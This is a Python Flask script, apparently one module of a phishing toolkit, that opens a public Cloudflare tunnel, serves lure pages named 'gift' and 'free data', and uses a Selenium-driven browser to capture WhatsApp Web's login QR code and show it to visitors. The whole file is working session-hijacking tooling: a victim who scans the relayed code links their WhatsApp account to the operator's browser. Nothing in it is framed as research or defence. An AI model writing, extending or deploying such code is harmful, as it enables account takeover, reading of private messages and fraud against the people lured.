import threading, subprocess, platform, time, os, sys, re
from flask import Flask, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service  # Step 1: Crucial Import

app = Flask(__name__)

driver = None
current_selection = 1  # Global variable to store the menu choice


def is_installed():
    try:
        subprocess.run(["cloudflared", "--version"],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       check=True)
        return True
    except:
        return False


def get_arch():
    arch = platform.machine()
    if arch == "x86_64":
        return "cloudflared-linux-amd64.deb"
    elif arch in ["aarch64", "arm64"]:
        return "cloudflared-linux-arm64.deb"
    else:
        print("Unsupported architecture")
        sys.exit(1)


def install_cloudflared():
    file_name = get_arch()
    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/{file_name}"
    subprocess.run(["wget", "-O", file_name, url], check=True)
    subprocess.run(["sudo", "dpkg", "-i", file_name], check=True)
    subprocess.run(["sudo", "apt-get", "install", "-f", "-y"], check=True)
    os.remove(file_name)


def start_cloudflare(port=5000):
    print("[+] Starting Cloudflare tunnel...")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    for line in process.stdout:
        print(line.strip())
        match = re.search(r"https://[-a-z0-9]+\.trycloudflare\.com", line)
        if match:
            print("\n[✓] Public URL:", match.group(0), "\n")
            break
    return process


def start_browser():
    global driver
    print("Browser Starting...")
    try:
        options = webdriver.ChromeOptions()
        # Step 2: Fix the "Selenium Manager" binary error
        # Ensure you have run: sudo apt install chromium-driver
        service = Service(executable_path="/usr/bin/chromedriver")

        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')

        driver = webdriver.Chrome(service=service, options=options)
        driver.get("https://web.whatsapp.com")
    except Exception as e:
        print(f"[-] Selenium Error: {e}")


@app.route('/')
def index():
    global current_selection
    # This renders the specific template based on your selection in sub_menu.py
    if current_selection == 1:
        return render_template("gift.html")
    elif current_selection == 2:
        return render_template("free_data.html")
    return "Default Page"


@app.route('/get_qr')
def get_qr():
    global driver
    try:
        if driver:
            canvas = driver.find_element(By.TAG_NAME, "canvas")
            base64_image = driver.execute_script("return arguments[0].toDataURL('image/png');", canvas)
            return jsonify({"qr_base64": base64_image})
        return jsonify({"error": "Browser not open yet"})
    except Exception:
        return jsonify({"error": "Can't Find QR Code"})


def main(x):
    global current_selection
    current_selection = x  # Store the 'x' passed from sub_menu.py

    print("[*] Checking cloudflared...")
    if not is_installed():
        install_cloudflared()

    # Start background tasks
    threading.Thread(target=start_browser, daemon=True).start()
    time.sleep(2)
    threading.Thread(target=start_cloudflare, args=(5000,), daemon=True).start()

    # Step 3: Start the Flask Server (Crucial for the link to work)
    print("[+] Starting Web Server on port 5000...")
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)